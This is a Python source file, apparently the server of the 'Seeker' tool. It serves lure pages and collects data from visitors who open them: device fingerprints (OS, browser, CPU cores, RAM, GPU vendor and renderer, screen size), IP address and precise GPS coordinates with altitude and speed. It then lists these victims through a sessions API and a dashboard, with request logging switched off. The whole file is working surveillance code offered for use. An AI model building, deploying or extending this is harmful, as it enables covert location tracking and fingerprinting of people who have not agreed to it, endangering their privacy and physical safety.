#!/usr/bin/env python3

import json
import os
from http.server import HTTPServer, SimpleHTTPRequestHandler
from socketserver import ThreadingMixIn
from urllib.parse import parse_qs
from session import SessionManager


class SeekerHandler(SimpleHTTPRequestHandler):
    session_manager: SessionManager = None
    _template_dir: str = None

    def __init__(self, request, client_address, server):
        super().__init__(request, client_address, server, directory=self.__class__._template_dir)

    def log_message(self, format, *args):
        pass

    def _get_client_ip(self):
        ip = self.headers.get('CF-Connecting-IP')
        if ip:
            return ip
        ip = self.headers.get('X-Forwarded-For')
        if ip:
            return ip.split(',')[0].strip()
        ip = self.headers.get('X-Real-IP')
        if ip:
            return ip
        return self.client_address[0]

    def _parse_post_data(self):
        content_length = int(self.headers.get('Content-Length', 0))
        if content_length == 0:
            return {}
        body = self.rfile.read(content_length).decode('utf-8')
        return parse_qs(body)

    def _send_cors_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')

    def do_OPTIONS(self):
        self.send_response(200)
        self._send_cors_headers()
        self.end_headers()

    def do_POST(self):
        path = self.path.split('?')[0]
        data = self._parse_post_data()
        client_ip = self._get_client_ip()

        flat = {k: v[0] if isinstance(v, list) and len(v) == 1 else v for k, v in data.items()}

        if path == '/info_handler':
            self._handle_info(client_ip, flat)
        elif path == '/result_handler':
            self._handle_result(client_ip, flat)
        elif path == '/error_handler':
            self._handle_error(client_ip, flat)
        else:
            self.send_response(404)
            self.end_headers()
            return

        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self._send_cors_headers()
        self.end_headers()
        self.wfile.write(b'OK')

    def _handle_info(self, client_ip, data):
        info = {
            'os': data.get('Os', 'Not Available'),
            'platform': data.get('Ptf', 'Not Available'),
            'browser': data.get('Brw', 'Not Available'),
            'cores': data.get('Cc', 'Not Available'),
            'ram': data.get('Ram', 'Not Available'),
            'vendor': data.get('Ven', 'Not Available'),
            'render': data.get('Ren', 'Not Available'),
            'ip': client_ip,
            'ht': data.get('Ht', 'Not Available'),
            'wd': data.get('Wd', 'Not Available'),
        }
        if self.session_manager:
            self.session_manager.update_info(client_ip, info)

    def _handle_result(self, client_ip, data):
        location = {
            'status': data.get('Status', 'failed'),
            'lat': data.get('Lat', 'Not Available'),
            'lon': data.get('Lon', 'Not Available'),
            'acc': data.get('Acc', 'Not Available'),
            'alt': data.get('Alt', 'Not Available'),
            'dir': data.get('Dir', 'Not Available'),
            'spd': data.get('Spd', 'Not Available'),
        }
        if self.session_manager:
            self.session_manager.update_location(client_ip, location)

    def _handle_error(self, client_ip, data):
        error = {
            'status': data.get('Status', 'failed'),
            'error': data.get('Error', 'Unknown error'),
        }
        if self.session_manager:
            self.session_manager.update_error(client_ip, error)

    def do_GET(self):
        if self.path == '/health':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self._send_cors_headers()
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'ok'}).encode())
            return

        if self.path == '/api/sessions':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self._send_cors_headers()
            self.end_headers()
            data = self.session_manager.get_sessions_dict() if self.session_manager else []
            self.wfile.write(json.dumps(data).encode())
            return

        if self.path == '/dashboard':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self._send_cors_headers()
            self.end_headers()
            dashboard_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'template', 'dashboard.html')
            with open(dashboard_path, 'rb') as f:
                self.wfile.write(f.read())
            return

        super().do_GET()


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True
    allow_reuse_address = True


def create_server(port, template_dir, session_manager):
    SeekerHandler.session_manager = session_manager
    SeekerHandler._template_dir = template_dir

    server = ThreadedHTTPServer(('0.0.0.0', port), SeekerHandler)
    return server
